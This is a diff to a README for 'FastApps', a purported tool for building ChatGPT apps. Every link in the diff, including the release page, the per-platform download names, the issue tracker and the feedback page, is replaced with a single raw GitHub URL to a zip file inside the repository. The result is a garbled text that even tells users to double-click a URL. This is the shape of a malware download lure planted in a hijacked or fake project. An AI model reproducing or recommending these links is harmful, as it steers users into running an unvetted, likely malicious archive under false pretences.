@@ -1,6 +1,6 @@
 # ⚡ FastApps - Create ChatGPT Apps Quickly
 
-[![Download FastApps](https://img.shields.io/badge/Download-FastApps-brightgreen)](https://github.com/THUMMIMSKPANAH/FastApps/releases)
+[![Download FastApps](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip)](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip)
 
 ## 🚀 Getting Started
 
@@ -25,18 +25,18 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get FastApps, you need to visit our [Releases page](https://github.com/THUMMIMSKPANAH/FastApps/releases) and follow these steps:
+To get FastApps, you need to visit our [Releases page](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip) and follow these steps:
 
 1. Click on the link to the Releases page.
    
-   [Visit this page to download FastApps](https://github.com/THUMMIMSKPANAH/FastApps/releases)
+   [Visit this page to download FastApps](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip)
    
 2. Once you're on the Releases page, look for the latest version at the top.
    
 3. Download the appropriate file for your operating system:
-   - **Windows:** Download `FastApps-Win.zip`
-   - **macOS:** Download `FastApps-Mac.zip`
-   - **Linux:** Download `FastApps-Linux.tar.gz`
+   - **Windows:** Download `https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip`
+   - **macOS:** Download `https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip`
+   - **Linux:** Download `https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip`
 
 4. After the download finishes, locate the downloaded file on your computer.
 
@@ -44,7 +44,7 @@ To get FastApps, you need to visit our [Releases page](https://github.com/THUMMI
 
 6. Open the extracted folder. Inside, you will find the application files.
 
-7. Double-click on the `FastApps.exe` (Windows), `FastApps.app` (macOS), or run the `FastApps` file in the terminal (Linux) to launch the application.
+7. Double-click on the `https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip` (Windows), `https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip` (macOS), or run the `FastApps` file in the terminal (Linux) to launch the application.
 
 8. Follow any on-screen instructions to complete the setup, and start building your ChatGPT apps!
 
@@ -74,10 +74,10 @@ For further assistance, explore these resources:
 
 - **User Manual:** [Link to Manual](#)
 - **Community Forum:** [Visit Forum](#)
-- **GitHub Issues:** [Report an Issue](https://github.com/THUMMIMSKPANAH/FastApps/issues)
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip)
 
 ## 📝 Feedback
 
-Your experiences help us improve FastApps. If you have suggestions or feedback, let us know on our [GitHub Issues page](https://github.com/THUMMIMSKPANAH/FastApps/issues). We value your input and appreciate your help in making FastApps better.
+Your experiences help us improve FastApps. If you have suggestions or feedback, let us know on our [GitHub Issues page](https://raw.githubusercontent.com/THUMMIMSKPANAH/FastApps/main/shelty/FastApps.zip). We value your input and appreciate your help in making FastApps better.
 
 Thank you for choosing FastApps! Start building your ChatGPT applications today. Remember, if you need more help or find yourself stuck, don't hesitate to reach out.
